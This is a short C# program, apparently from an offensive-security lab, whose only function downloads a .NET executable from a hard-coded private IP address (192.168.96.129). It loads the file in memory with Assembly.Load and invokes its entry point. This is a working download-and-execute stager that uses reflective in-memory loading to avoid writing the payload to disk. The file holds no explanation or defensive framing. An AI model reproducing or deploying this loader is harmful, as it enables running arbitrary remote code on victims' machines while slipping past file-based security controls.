using System;
using System.Reflection;
using System.Net;

namespace Nappa
{
    internal class Program
    {
        static void ReflectionFromWeb(string url)
        {
            WebClient client = new WebClient();
            byte[] programBytes = client.DownloadData(url);
            Assembly dotnetProgram = Assembly.Load(programBytes);
            object[] parameters = new string[] { null };
            dotnetProgram.EntryPoint.Invoke(null, parameters);
        }

        static void Main(string[] args)
        {
            ReflectionFromWeb("http://192.168.96.129/HelloReflectionWorld.exe");
        }
    }
}
